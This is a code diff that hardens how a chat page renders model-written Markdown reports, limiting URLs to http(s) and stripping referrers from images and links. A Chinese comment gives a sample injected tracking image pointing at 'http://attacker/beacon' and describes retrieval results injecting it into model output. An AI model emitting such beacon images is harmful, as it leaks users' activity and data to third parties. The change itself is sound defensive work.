@@ -23,7 +23,7 @@ import type {
   VersionDetail,
   VersionInfo,
 } from "@/lib/types";
-import { DETAIL_LEVEL_LABELS, STATUS_LABELS } from "@/lib/types";
+import { DETAIL_LEVEL_LABELS } from "@/lib/types";
 import { cn, relativeTime } from "@/lib/utils";
 
 interface Message {
@@ -426,7 +426,26 @@ export default function ChatPage() {
           <div className="max-h-[460px] min-h-[300px] flex-1 overflow-y-auto p-4">
             {versionDetail?.markdown ? (
               <div className="prose-report">
-                <ReactMarkdown>{versionDetail.markdown}</ReactMarkdown>
+                <ReactMarkdown
+                  // 安全：路书内容来自模型 + 外部检索结果，可能被注入
+                  // `![](http://attacker/beacon?d=...)` 这类埋点图片。
+                  // 这里①只放行 http(s) 协议；②图片不发送 Referer，
+                  // 避免把「谁在何时打开了这份路书」泄漏给第三方。
+                  urlTransform={(url) =>
+                    /^https?:\/\//i.test(url) ? url : ""
+                  }
+                  components={{
+                    img: ({ node, ...props }) => (
+                      // eslint-disable-next-line @next/next/no-img-element
+                      <img {...props} referrerPolicy="no-referrer" loading="lazy" alt="" />
+                    ),
+                    a: ({ node, ...props }) => (
+                      <a {...props} target="_blank" rel="noopener noreferrer nofollow" />
+                    ),
+                  }}
+                >
+                  {versionDetail.markdown}
+                </ReactMarkdown>
               </div>
             ) : (
               <div className="flex h-full flex-col items-center justify-center gap-2 text-center text-xs text-slate-400">
